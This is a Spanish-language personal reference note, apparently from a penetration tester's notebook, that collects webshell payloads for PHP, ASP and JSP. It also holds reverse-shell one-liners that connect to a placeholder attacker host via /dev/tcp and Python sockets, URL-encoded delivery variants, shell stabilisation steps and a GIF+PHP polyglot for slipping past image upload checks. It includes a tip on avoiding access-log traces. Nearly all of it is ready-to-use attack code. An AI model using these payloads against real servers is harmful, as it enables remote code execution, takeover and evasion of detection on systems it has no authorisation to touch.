---
tipo: meta
aliases:
  - Payloads webshell
  - web shells
tags:
  - meta/referencia
  - dominio/web
---

# Webshells - matriz de referencia

> [!info] Referencia pura, no un zettel
> El payload que subís o incluís. Criterio de cuándo webshell vs reverse shell en [[Webshell]]. `yi``  ` copia.

## One-liner por lenguaje

`<?php system($_GET['c']); ?>`
PHP. Uso: `?c=id`.

`<?php echo shell_exec($_GET['c']); ?>`
PHP, `shell_exec` devuelve la salida completa como string.

`<%eval request("c")%>`
ASP clásico.

`<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
JSP.

`<?php eval($_POST['c']); ?>`
PHP por POST — más sigiloso, no queda en el access.log como query string.

## Reverse shell — mejor que webshell interactiva

Un webshell te da comandos sueltos; una reverse shell te da sesión. Payload PHP que dispara la reversa:

`<?php system("bash -c 'bash -i >& /dev/tcp/ATACANTE/443 0>&1'"); ?>`
Reemplazar ATACANTE. En el atacante: `nc -lvnp 443`.

Desde un webshell ya subido, el mismo one-liner por el parámetro:

`?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATACANTE/443+0>%261'`
URL-encodeado: `&`→`%26`, espacios→`+`.

`?c=python3+-c+'import+socket,os,pty;s=socket.socket();s.connect(("ATACANTE",443));[os.dup2(s.fileno(),f)for+f+in(0,1,2)];pty.spawn("bash")'`
Reverse shell en Python si no hay bash conveniente.

## Estabilizar la shell

```sh
python3 -c 'import pty;pty.spawn("bash")'
export TERM=xterm
Ctrl+Z; stty raw -echo; fg; Enter
```
Pasos para una TTY interactiva desde la reverse shell.

## Polyglot GIF+PHP (para subir como imagen)

```
GIF89a;
<?php system($_GET['c']); ?>
```
Se guarda como `.jpg`/`.gif`, pasa validación de imagen, ejecuta si se procesa como PHP. Ver [[File upload bypass - matriz de referencia]] § magic bytes.

> [!warning] `opsec: quemado` como payload persistente
> Un webshell dejado en disco es evidencia forense de primer nivel y lo levanta cualquier AV/EDR web. Para un engagement real: usar reverse shell en memoria y borrar el archivo subido apenas se ejecuta. Registrar en el informe qué se dejó y qué se limpió.

## Relacionadas

[[Webshell]] · [[File upload bypass - matriz de referencia]] · [[MOC - File upload]]
